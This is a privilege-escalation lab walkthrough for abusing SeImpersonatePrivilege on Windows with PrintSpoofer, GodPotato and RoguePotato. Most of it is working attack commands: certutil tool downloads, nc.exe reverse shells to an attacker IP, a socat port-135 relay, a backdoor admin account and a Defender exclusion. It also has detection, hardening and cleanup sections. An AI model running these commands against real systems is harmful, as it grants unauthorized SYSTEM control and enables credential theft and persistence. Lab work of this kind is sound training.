# SeImpersonate Potato Attack to SYSTEM

> [!warning] Authorized use only
> Perform this lab **only** against systems you own or are explicitly permitted to test — your own isolated VMs/lab network. Running these techniques against systems without written authorization is illegal. Keep all lab VMs on a host-only / NAT network with no route to production or the internet unless the lab explicitly requires it.

**Module:** 09 · Privilege Escalation · **Difficulty:** Advanced · **Time:** ~45–75 min

## Objective

Starting from a **service account shell that holds `SeImpersonatePrivilege`** (the token a web/IIS or SQL Server service typically runs with), escalate to **NT AUTHORITY\SYSTEM** using a **Potato-family** attack. You will verify the privilege with `whoami /priv`, then abuse it three ways — **PrintSpoofer**, **GodPotato**, and **RoguePotato** — coercing a privileged NTLM/RPC authentication and impersonating the resulting SYSTEM token.

## Prerequisites

- Understanding of Windows access tokens, impersonation, and why `SeImpersonatePrivilege` / `SeAssignPrimaryTokenPrivilege` allow full takeover — see [Windows Privilege Escalation](../README.md).
- Familiarity with service accounts (`IIS APPPOOL\*`, `NT SERVICE\MSSQLSERVER`, `LOCAL SERVICE`, `NETWORK SERVICE`) and how they receive impersonate rights by default.
- Ability to get a foothold shell as a service account (Netcat / a web-shell / `xp_cmdshell`) — the broader escalation context is the Privilege Escalation module MOC.
- Basic `msfvenom` payload generation and file transfer to the target.

## Environment / Setup

**Topology:**

| Role | OS / Version | IP (example) | Purpose |
|---|---|---|---|
| Attacker | Kali Linux (latest) | `192.168.56.10` | Host tools, catch reverse shells, run the RoguePotato RPC relay |
| Target | Windows Server 2019 / Windows 10 22H2 | `192.168.56.20` | Runs a service (IIS/MSSQL) as a low-priv service account with `SeImpersonatePrivilege` |

**Network:** host-only `vboxnet0` (`192.168.56.0/24`) — no production route.
**Target VM name:** `WIN-POTATO` (`WORKGROUP\WIN-POTATO`, local machine, non-domain is fine).

**Why the privilege is present:** service accounts such as `LOCAL SERVICE`, `NETWORK SERVICE`, and IIS/SQL application-pool identities are granted `SeImpersonatePrivilege` by default so they can impersonate authenticated clients. That single privilege is enough for a full SYSTEM takeover — the essence of the Potato family.

**Tools required:**

| Tool | Purpose | Source |
|---|---|---|
| `whoami` | Confirm the token privileges | Built into Windows |
| `PrintSpoofer64.exe` | Coerce SYSTEM via the Print Spooler named pipe | [itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer) |
| `GodPotato-NET4.exe` | DCOM/RPC OXID impersonation (spooler-independent) | [BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato) |
| `RoguePotato.exe` | OXID-resolver-redirect impersonation | [antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato) |
| `socat` | Redirect the OXID resolver (port 135) back to the target for RoguePotato | Kali (`apt install socat`) |
| `nc.exe` / `nc` | Foothold + SYSTEM reverse shells | Netcat / [int0x33/nc.exe](https://github.com/int0x33/nc.exe) |
| `msfvenom` | Generate a reverse-shell exe if desired | Metasploit Framework (Kali) |

**Setup — establish the service-account foothold** (one-time, to simulate the exploited service). As Administrator on `WIN-POTATO`, install a foothold shell that runs under a service account. The simplest reproducible way is to run a Netcat listener *as* a service account via `PsExec`:

```powershell
# --- ADMIN SETUP on WIN-POTATO: simulate a compromised service-account shell ---
# Option A (quickest): drop a service-account cmd via Sysinternals PsExec.
#   -u "nt authority\local service" gives you a shell with SeImpersonatePrivilege,
#   exactly like a popped IIS/MSSQL service.
PsExec64.exe -accepteula -i -u "nt authority\local service" cmd.exe

# Option B (realistic): install IIS + an ASPX web-shell, or MSSQL with xp_cmdshell,
#   and get your foothold through that service. Either way the resulting shell
#   runs as a service account holding SeImpersonatePrivilege.
```

> [!note] Snapshot first
> Take a VM snapshot of `WIN-POTATO` now (named `clean`) so you can revert in *Cleanup*. From here on you act **only** through the service-account shell — you do **not** have Administrator or SYSTEM.

## Walkthrough

> [!note] From this point you are the service account
> Every command below runs inside the foothold shell (e.g. `nt authority\local service`, `iis apppool\DefaultAppPool`, or `nt service\mssqlserver`). You are **not** an administrator.

### 1. Verify the token holds SeImpersonatePrivilege

This is the gate for the entire attack — if the privilege is `Disabled`/absent, no Potato works.

```cmd
whoami
whoami /priv
```

You should see something like the following — note `SeImpersonatePrivilege` is present (state `Enabled` or `Disabled`; either is exploitable, Potato tools enable it themselves):

```text
nt authority\local service

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
```

If `SeImpersonatePrivilege` appears in that list, the box is vulnerable to the Potato family. Proceed.

### 2. Transfer the tools to the target

Host the binaries from Kali and pull them down with `certutil`:

```bash
# On Kali (attacker) — from the directory holding the downloaded tools
python3 -m http.server 80
```

```cmd
:: In the service-account shell on WIN-POTATO — stage into a writable dir
cd C:\Windows\Temp
certutil.exe -urlcache -split -f http://192.168.56.10/PrintSpoofer64.exe PrintSpoofer64.exe
certutil.exe -urlcache -split -f http://192.168.56.10/GodPotato-NET4.exe GodPotato-NET4.exe
certutil.exe -urlcache -split -f http://192.168.56.10/RoguePotato.exe RoguePotato.exe
certutil.exe -urlcache -split -f http://192.168.56.10/nc.exe nc.exe
```

### 3. Path A — PrintSpoofer (Print Spooler named pipe)

PrintSpoofer coerces the **Print Spooler** service to connect back to a named pipe you control, then impersonates the SYSTEM token that connects. It is the fastest method when the Spooler service is running.

Run a command directly as SYSTEM with `-c`, or pop an interactive shell with `-i`:

```cmd
PrintSpoofer64.exe -i -c cmd
```

Expected output — the pipe is served, the token is captured, and you land in a new SYSTEM shell:

```text
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.17763.xxxx]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

Confirm the new identity:

```cmd
whoami
```

```text
nt authority\system
```

For a reverse shell instead of interactive, catch it on Kali (`nc -lvnp 4444`) and run:

```cmd
PrintSpoofer64.exe -c "C:\Windows\Temp\nc.exe 192.168.56.10 4444 -e cmd.exe"
```

### 4. Path B — GodPotato (DCOM/RPC OXID, works without the Spooler)

If the Print Spooler is disabled (common hardening after PrintNightmare), use **GodPotato**, which abuses the DCOM OXID resolver locally and works on Windows 8 – 11 / Server 2012 – 2022 with the matching .NET build (`-NET4` needs .NET 4.x installed, present by default).

Run an arbitrary command as SYSTEM with `-cmd`:

```cmd
GodPotato-NET4.exe -cmd "cmd /c whoami"
```

Expected output — GodPotato sets up the DCOM object, hijacks the RPC/OXID callback, duplicates the SYSTEM token, and runs your command:

```text
[*] CombaseModule: 0x140720753475584
[*] DispatchTable: 0x140720755663088
[*] UseProtseqFunction: 0x140720755053168
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] Trigger RPCSS
[*] DCOM obj GUID: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
[*] DCOM obj Pipe Connect
[*] Marshal Object bytes length: 100
[*] UnMarshal Object
[*] Get Token: 000000000000xxxx
[*] Process Create: 1234
nt authority\system
```

For an interactive reverse shell:

```cmd
GodPotato-NET4.exe -cmd "C:\Windows\Temp\nc.exe 192.168.56.10 4445 -e cmd.exe"
```

### 5. Path C — RoguePotato (OXID-resolver redirect)

**RoguePotato** works on newer builds where the older RottenPotato trick was patched. It redirects the DCOM **OXID resolver** to an attacker-controlled `socat` relay on TCP **135**, which forwards back to a `RogueOxidResolver` on the target, letting RoguePotato impersonate the SYSTEM authentication.

On **Kali**, stand up the port-135 redirector back to the target:

```bash
socat tcp-listen:135,reuseaddr,fork tcp:192.168.56.20:9999
```

On **WIN-POTATO** (service-account shell), run RoguePotato pointing `-r` at the Kali relay and `-l` at the local resolver port `socat` forwards to:

```cmd
RoguePotato.exe -r 192.168.56.10 -e "C:\Windows\Temp\nc.exe 192.168.56.10 4446 -e cmd.exe" -l 9999
```

Expected output on the target:

```text
[*] RoguePotato - a Rotten/JuicyPotato fork
[+] Starting RoguePotato...
[*] Creating Rogue OXID resolver thread
[*] Listening on pipe \\.\pipe\RoguePotato\pipe\epmapper, waiting for client connection
[*] Client connected!
[*] Calling gethostbyname
[+] Got SYSTEM token, spawning process...
[+] Process created, enjoy!
```

Catch the SYSTEM shell on Kali:

```bash
nc -lvnp 4446
```

```text
listening on [any] 4446 ...
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.20] 49xxx
Microsoft Windows [Version 10.0.17763.xxxx]
C:\Windows\system32>whoami
nt authority\system
```

## Expected Result

> [!success] Proof of success
> Any one of the three paths yields a process running as **`NT AUTHORITY\SYSTEM`** — the highest local privilege. From that shell you own the host: dump SAM/LSASS, add accounts, install persistence, or pivot.

```text
C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> whoami /priv | findstr /i SeDebug
SeDebugPrivilege              Debug programs                            Enabled
```

To make the win concrete, create a local admin from the SYSTEM shell:

```cmd
net user potatolab P0tato!Lab2026 /add
net localgroup administrators potatolab /add
```

## Detection & Blue-Team

- **Telemetry / log sources:**
  - **Sysmon Event ID 1** (*Process Create*) — a service account (`LOCAL SERVICE` / `NETWORK SERVICE` / `IIS APPPOOL\*` / `NT SERVICE\MSSQLSERVER`) spawning `cmd.exe`/`nc.exe` **as SYSTEM** is a glaring parent/child + integrity-level anomaly. Look for a child process whose token user is `SYSTEM` but whose parent chain traces back to a non-SYSTEM service identity.
  - **Sysmon Event ID 17/18** (*Pipe Created / Pipe Connected*) — Potato tools create tell-tale named pipes: PrintSpoofer/RoguePotato pipe names containing `\pipe\` served by a user process, e.g. `\Device\NamedPipe\...\pipe\epmapper` or a spooler pipe (`\pipe\spoolss`) connected by an unexpected process.
  - **Security 4624 / 4672** — a Logon (type 3) immediately followed by *Special privileges assigned* (`SeImpersonatePrivilege`, `SeTcbPrivilege`) to a token derived from a service account.
  - **Sysmon Event ID 3** (*Network Connect*) — RoguePotato specifically produces an **outbound connection to TCP 135** to an external host (the `socat` relay). Legitimate DCOM to port 135 is normally inbound/local; an outbound 135 to a non-DC peer is high-fidelity.
  - **Security 4720 / 4732** — the SYSTEM-run payload creating `potatolab` and adding it to Administrators.
- **Detection idea:** Alert when a process whose token maps to a **service account** creates a child process running at **SYSTEM/High integrity**, OR when Print Spooler (`spoolsv.exe`) connects to a client named pipe hosted by a non-service process. For RoguePotato, alert on any outbound TCP/135 to a host that is not a domain controller. Correlate `4624` type-3 → `4672` impersonation on service SIDs.
- **Mitigation / hardening:**
  - **Remove `SeImpersonatePrivilege`** from service identities that do not need it, and prefer scoped **virtual accounts** or **gMSA** with least privilege over broad service accounts.
  - **Disable the Print Spooler** (`Stop-Service Spooler; Set-Service Spooler -StartupType Disabled`) on servers that do not print — kills PrintSpoofer.
  - Block **outbound TCP 135** at the host firewall — breaks RoguePotato's OXID redirect.
  - Keep systems patched; run services under identities that cannot impersonate, and enable **AppLocker / WDAC** to stop unsigned Potato binaries executing from `C:\Windows\Temp`.

## Cleanup

- Revert `WIN-POTATO` to the `clean` snapshot (fastest, guaranteed clean), **or** run the teardown below from an admin/SYSTEM shell.

```cmd
:: --- TEARDOWN on WIN-POTATO (if not reverting the snapshot) ---
:: Remove the proof-of-escalation account
net localgroup administrators potatolab /delete
net user potatolab /delete

:: Remove staged tools
del /f /q C:\Windows\Temp\PrintSpoofer64.exe
del /f /q C:\Windows\Temp\GodPotato-NET4.exe
del /f /q C:\Windows\Temp\RoguePotato.exe
del /f /q C:\Windows\Temp\nc.exe

:: Clear the certutil URL cache used for transfer
certutil.exe -urlcache * delete
```

```bash
# On Kali: stop the socat relay (Ctrl-C) and the HTTP server, then
rm -f PrintSpoofer64.exe GodPotato-NET4.exe RoguePotato.exe nc.exe
```

## Troubleshooting

| Symptom | Likely cause | Fix |
|---|---|---|
| `whoami /priv` shows **no** `SeImpersonatePrivilege` | Foothold shell is not a service account (e.g. a plain user) | Re-establish the foothold as `LOCAL SERVICE`/`NETWORK SERVICE`/an app-pool or SQL service identity; only those get impersonate rights by default. |
| PrintSpoofer: `[-] The Print Spooler service is not running` / no pipe | Spooler disabled (PrintNightmare hardening) | Use **GodPotato** or **RoguePotato**, which do not depend on the Spooler. |
| GodPotato: `Error UnMarshal Object` or wrong .NET | Wrong build for the installed .NET runtime | Match the binary to the runtime: `GodPotato-NET4.exe` for .NET 4.x, `-NET35`/`-NET2` variants otherwise (`reg query "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP"`). |
| RoguePotato: hangs at *waiting for client connection* / no SYSTEM shell | `socat` relay missing, wrong IPs, or port 135 already in use on Kali | Ensure `socat tcp-listen:135,...,fork tcp:192.168.56.20:9999` runs on Kali; `-l 9999` must match the socat forward port; stop any local RPC listener on Kali's 135. |
| Any tool: token captured but child process is still the service account | Impersonation succeeded but the primary-token spawn used the wrong API path | Use the tool's own spawn flag (`-c`/`-cmd`/`-e`) rather than piping into an existing shell; retry — some tools need `SeAssignPrimaryTokenPrivilege` and fall back automatically. |
| Binaries flagged/quarantined by Defender | Known Potato signatures | In the isolated lab, add a Defender exclusion for `C:\Windows\Temp` or disable real-time protection **on the lab VM only**. |

## References

- [itm4n/PrintSpoofer — abusing SeImpersonatePrivilege via the Print Spooler](https://github.com/itm4n/PrintSpoofer)
- [itm4n blog — "Windows Server 2019 and SeImpersonate: PrintSpoofer"](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [BeichenDream/GodPotato — DCOM/RPC OXID impersonation](https://github.com/BeichenDream/GodPotato)
- [antonioCoco/RoguePotato — OXID resolver redirect fork](https://github.com/antonioCoco/RoguePotato)
- [HackTricks — SeImpersonate / SeAssignPrimaryToken (Roguepotato, PrintSpoofer, JuicyPotato)](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens)
- [MITRE ATT&CK T1134.001 — Access Token Manipulation: Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001/)

## Related

- ROADMAP — where this lab fits in the curriculum
- [Windows Privilege Escalation](../README.md) — parent escalation context
- Privilege Escalation — module Map-of-Content
- [Windows Unquoted Service Path to SYSTEM](Windows-Unquoted-Service-Path-to-SYSTEM.md) — sibling Windows privesc lab (service-misconfig vector, not token impersonation)
